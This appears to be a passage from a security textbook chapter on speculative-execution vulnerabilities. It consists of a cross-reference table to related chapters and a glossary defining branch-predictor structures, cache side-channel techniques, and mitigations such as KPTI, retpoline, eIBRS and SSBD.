| Domain / Chapter | Section in This Chapter | Relationship |
|---|---|---|
| Domain 2, Ch 2A (page tables, KPTI, PCID) | §4 Meltdown/KPTI, §8.4 prefetch side-channels | KPTI page-table split is the primary Meltdown mitigation; PCID optimization reduces KPTI performance cost |
| Domain 5, Ch 5A (KASLR, SMEP, SMAP) | §8.4 prefetch-based KASLR bypass | Spectre side channels provide KASLR defeat without memory corruption, feeding kernel exploit chains |
| Domain 6, Ch 6A (ASLR bypass) | §8.4 prefetch timing, §2 Spectre v1 gadgets | Side-channel ASLR derandomization is a non-corruption alternative to information leaks |
| Domain 6, Ch 6B (kernel mitigation bypass) | §3 Spectre v2 kernel exploitation, §6.4 Spectre-PHT | Spectre v2 enables cross-privilege kernel-memory reads; PHT training poisons kernel branch prediction |
| Domain 7, Ch 7B (SGX, Rowhammer, HW attacks) | §4 Meltdown → L1TF/Foreshadow, §7 cache channels → SGX | Cache-timing primitives from this chapter are the building blocks for SGX enclave side-channel extraction |
| Domain 2, Ch 2B (syscall dispatch, seccomp) | §2.5 eBPF Spectre v1 gadgets, §5.2 SSB in eBPF | eBPF's JIT output is the primary kernel Spectre v1 attack surface; seccomp applies SSBD to sandboxed processes |

---

## Glossary

| Term | Definition |
|---|---|
| **Speculative execution** | CPU optimization executing instructions before branch resolution is known; rolled back architecturally on misprediction but leaving microarchitectural traces |
| **PHT** | Pattern History Table — branch predictor structure recording taken/not-taken history of conditional branches; exploited by Spectre v1/PHT |
| **BTB** | Branch Target Buffer — cache of indirect branch target addresses; poisoned in Spectre v2 to redirect speculative execution |
| **RSB** | Return Stack Buffer — LIFO predictor for `ret` targets; poisoned in SpectreRSB when RSB underflows to BTB fallback |
| **BHB** | Branch History Buffer — shift register of recent branch outcomes feeding BTB lookup; exploited in Spectre-BHB (CVE-2022-0001) |
| **Retpoline** | Software construct replacing indirect branches with `call`+`ret`+trap sequence to prevent BTB-based speculative redirection |
| **eIBRS** | Enhanced Indirect Branch Restricted Speculation — hardware mitigation automatically isolating branch prediction across privilege levels |
| **KPTI** | Kernel Page Table Isolation — separate user/kernel page tables preventing Meltdown and hardening KASLR against TLB-based probing |
| **FLUSH+RELOAD** | Cache side-channel: attacker flushes a shared cache line, waits for victim, then measures reload time to detect victim access |
| **PRIME+PROBE** | Cache side-channel: attacker fills a cache set with own data, waits for victim, then re-accesses to detect evictions (no shared memory needed) |
| **SSBD** | Speculative Store Bypass Disable — microcode feature preventing speculative store-to-load forwarding bypass (Spectre v4 mitigation) |
| **array_index_nospec** | Linux kernel macro using branchless `cmp`+`sbb`+`and` to clamp array indices to bounds even during speculative execution |
| **Speculation window** | Number of micro-ops that can execute speculatively before misprediction detection; bounded by ROB depth (224 on Skylake, 512 on Golden Cove) |
| **Training Solo** | 2025 attack class demonstrating self-training Spectre v2 within a single privilege domain, bypassing eIBRS domain isolation |
| **Branch Privilege Injection** | CVE-2024-45332 — race condition in Intel branch prediction allowing cross-privilege BTI despite eIBRS, affecting 9th-gen+ Intel CPUs |
